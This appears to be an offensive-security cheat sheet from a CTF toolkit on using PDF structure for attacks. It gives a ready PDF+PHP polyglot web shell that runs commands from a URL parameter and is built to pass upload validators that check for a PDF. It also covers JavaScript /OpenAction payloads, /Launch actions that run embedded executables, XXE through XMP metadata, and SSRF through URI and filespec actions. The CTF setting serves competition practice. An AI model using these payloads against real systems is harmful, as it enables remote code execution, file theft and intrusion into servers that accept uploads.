# PDF Deep — structure for polyglots and injections

## The structure — enough to craft

```
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
           /Contents 4 0 R >> endobj
4 0 obj << /Length N >> stream
<content stream bytes>
endstream endobj
xref ... trailer ... %%EOF
```

Facts that matter:

- `%PDF-` must appear within the first 1024 bytes — anything after is
  "junk to readers, payload to interpreters"
- readers are tolerant: xref can be stale/wrong, streams uncompressed
- `stream`/`endstream` content is raw bytes — payload space that survives
  structural validation

## PDF+PHP polyglot — validator wants "a PDF"

```
%PDF-1.4
<?php system($_GET['c']); ?>    — PHP executes; PDF readers tolerate
                                  trailing junk OR wrap the php in a stream
```

Cleaner: payload inside a stream object the PDF still parses:

```
%PDF-1.4
1 0 obj << /Length 200 >> stream
<?php system($_GET['c']); ?>
endstream endobj
%%EOF
```

`pdfinfo`/renderers still parse; PHP include/exec hits the `<?php` inside.

apexsurvive shape — a file-write API validating `parseable PDF` and the
payload bytes carried inside the content stream get evaluated by the
renderer/template engine downstream — `file-overwrite.md`.

## JavaScript inside PDF — `/OpenAction` and `/AA`

```
<< /OpenAction << /S /JavaScript /JS (app.alert("x")) >> >>
```

or `/AA`/`/Names`/`/JavaScript` name-tree entries. Runs in Acrobat and
some viewers — NOT in headless Chrome's print-to-PDF (that's HTML-side,
not PDF JS), not poppler/pdftoppm. Useful only when a scripted viewer is
the consumer — rare in CTF.

## Embedded files + launch actions

```
<< /Type /Filespec /F (x.exe) /EF << /F 5 0 R >> >>
<< /S /Launch /F (x.exe) /P (args) >>
```

`/Launch` triggers a program on open — Acrobat prompts, some embedded
viewers just run. `EmbeddedFile` streams carry payload into the file.

## Ghostscript hand-off — the real exec surface

`.pdf` rendered via gs → the PS primitives — `image-attacks.md`. The PDF
wraps PostScript-ish operators but gs runs the *PS* interpreter on `.ps`
files more directly; for pdf specifically the `%pipe%`/file-access
primitives apply through gs's PDF interpreter too — `.setpdfwrite`/
file-access operators still gate behind SAFER.

## `pdf_text.py` — reading generated/converted PDFs back

When the attack is HTML-injection into a *generated* PDF (weasyprint/
wkhtmltopdf/puppeteer), the flag lands in the output text:

```bash
python3 tools/web/pdf_text.py report.pdf --find-flag
python3 tools/web/pdf_text.py "$BASE/out/x.pdf" --grep 'flag\{|FLAG'
python3 tools/web/pdf_text.py --make-pdf /tmp/t.pdf --make-pdf-line x  # test fixture
```

## Form fields and annotations — reflected-text surface

AcroForm `T` fields, annotation `/Contents`, document metadata
(`/Title`, `/Author`) — text that the app's "pdf info" endpoint may echo:
injection surface for the echo path, and metadata that persists through
conversions.

## XMP metadata — the XML inside PDF

`/Metadata` XMP stream is XML — `<x:xmpmeta>` RDF — XML entities inside it
reach XML-parsing tools — XXE-in-PDF when the app reads XMP.

## Incremental updates — appending after `%%EOF`

PDF supports appended update sections after the first `%%EOF` — payload
after EOF is still valid PDF. PHP-wise, the whole file is script text —
payload anywhere.

## The `file:`/`launch`/`uri` fetch surface — SSRF inside PDF

`URI` actions, `GoToR` remote destinations, embedded media refs,
`/F (http://x)` filespecs — a consumer/renderer that resolves them fetches
the URL — SSRF/OOB callback via `oob_listener`.

## Falsifiers

- the app stores/streams PDFs only — no parser, no renderer
- the renderer is a hardened one (no JS, no gs reach)

## Output to record

- which injection surface fired + the verbatim derived output
